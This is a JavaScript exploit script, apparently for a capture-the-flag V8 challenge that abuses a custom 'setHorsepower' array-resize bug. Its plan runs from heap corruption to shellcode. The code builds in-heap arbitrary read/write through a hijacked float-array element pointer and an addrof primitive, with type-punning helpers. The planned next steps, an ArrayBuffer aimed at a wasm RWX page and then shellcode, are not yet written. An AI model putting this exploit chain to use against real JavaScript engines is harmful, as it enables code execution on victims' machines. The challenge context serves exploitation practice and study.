// Game plan:
// [X] 1: read_in_heap and write_in_heap (Through JSArray of floats)
// [X] 2: addrof (Change float arr to obj arr)
// [] 3: Set up an ArrayBuffer to point to a wasm RWX page
// [] 4: Shellcode (See shellcode.js)

/*
    We can now read/write in the js heap. Next, we want to get arbitrary read/write. To do so, we're gonna use a Uint8Array U
    and make a float array F point to U's data pointer. That pointer is not restricted to the heap, so we can then write an addr 
    to F[0] and read/write to U.
    To do so, we need to find the address of a Uint8Array. We currently can only find the addresses of JSArrays that have 
    their elements behind them by reading their element pointer and offsetting the elements.
    So in this step we want to make an addrof(obj) function that works with arbitrary objects.
    To do so, we're gonna make an array with 1 object, write the object whose addr we want to it
    and read the value as a float. A writeup I found changed the array's map to one of floats
    to trick v8 into reading it as a float when arr[0] is read.
    Since we already have read/write within the heap, we are going to start with an array of floats, find the address
    of it's elements pointer, and in addrof() just write arr[0]=obj and read the element ptr, then read the element.
    We just need a JSarray and it's elementptr addr as setup
*/

// ------------------------------------------------------------------------------------------
// ------------------------------------------------------------------------------------------
// ------------------------------------------------------------------------------------------ STEP 1
// ------------------------------------------------------------------------------------------
// ------------------------------------------------------------------------------------------

// Utils, ftoi, itof, print hex
var buf = new ArrayBuffer(8);
// Views of buf for type punning
var f64_buf = new Float64Array(buf);
var u32_buf = new Uint32Array(buf);
function ftoi(val) {
  f64_buf[0] = val;
  return BigInt(u32_buf[0]) + (BigInt(u32_buf[1]) << 32n);
}
// low 32 bits of number/float value in the low 32 bits of BigInt output
function ftoi_low32(val) {
  f64_buf[0] = val;
  return BigInt(u32_buf[0]);
}
// high 32 bits of number/float value in the low 32 bits of BigInt output
function ftoi_hi32(val) {
  f64_buf[0] = val;
  return BigInt(u32_buf[1]);
}
function itof(val) {
  u32_buf[0] = Number(val & 0xffffffffn);
  u32_buf[1] = Number(val >> 32n);
  return f64_buf[0];
}
function print_hex(int) {
  console.log("0x" + int.toString(16).padStart(16, "0"));
}
function print_fptr(number) {
  print_hex(ftoi(number));
}
// Preserves high 32 bits
function compress_ptr(old_val, low_32bits_to_set) {
  return itof((ftoi_hi32(old_val) << 32n) + low_32bits_to_set);
}
// Preserves high 32 bits and applies the read offset used by JSArrays in reverse (-8 bytes)
function compress_elementptr(old_val, low_32bits_to_set) {
  // No idea why the -8n is needed (It's a 64bit/8byte offset). Length of the array stored before the elements?
  return compress_ptr(old_val, low_32bits_to_set - 8n);
}

function float_arr_pointing_at(addr) {
  var float_buf = [9.1, 9.2];
  float_buf.setHorsepower(4);
  // Write the pointer to the low 32 bits of the second 64bits of the float_buf array, which is the compressed element pointer
  // It should now point to addr, so we car read/write float_buf[0] at that address
  float_buf[3] = compress_elementptr(float_buf[3], addr);
  return float_buf;
}
function read_in_heap(addr) {
  return float_arr_pointing_at(addr)[0];
}
function write_in_heap(addr, value) {
  float_arr_pointing_at(addr)[0] = value;
}

// ------------------------------------------------------------------------------------------
// ------------------------------------------------------------------------------------------
// ------------------------------------------------------------------------------------------ END STEP 1
// ------------------------------------------------------------------------------------------
// ------------------------------------------------------------------------------------------

var obj_arr = [0.1];
console.log("obj_arr with float:");
%DebugPrint(obj_arr);

obj_arr.setHorsepower(4);
var obj_arr_elementptr = ftoi_low32(obj_arr[2]);
console.log(
  "obj_arr_elementptr: (Should match the lower 32bits of the elements field in the DebugPrint above)"
);
print_hex(obj_arr_elementptr);
var obj_arr_base = obj_arr_elementptr + 8n + 8n; // offset and 1 element
console.log(
  "obj_arr_base: (Should match the lower 32bits of the JSarray addr in the DebugPrint above)"
);
print_hex(obj_arr_base);
var obj_arr_elementptr_addr = obj_arr_base + 8n; //Skip compressed map
console.log("obj_arr_elementptr_addr:");
print_hex(obj_arr_elementptr_addr);
console.log(
  "read_in_heap(obj_arr_elementptr_addr):(Should match the lower 32bits of obj_arr_elementptr above)"
);
print_fptr(read_in_heap(obj_arr_elementptr_addr));

function addrof(obj) {
  obj_arr[0] = obj;
  var elementptr = ftoi_low32(read_in_heap(obj_arr_elementptr_addr));
  var val = ftoi_low32(read_in_heap(elementptr + 8n));
  return val;
}

var test_obj = { A: 1 };
console.log("test_obj:");
%DebugPrint(test_obj);
console.log(
  "addrof(test_obj): (Should match the lower 32bits of the JS_OBJECT address in the DebugPrint above)"
);
print_hex(addrof(test_obj));

while (true) {}
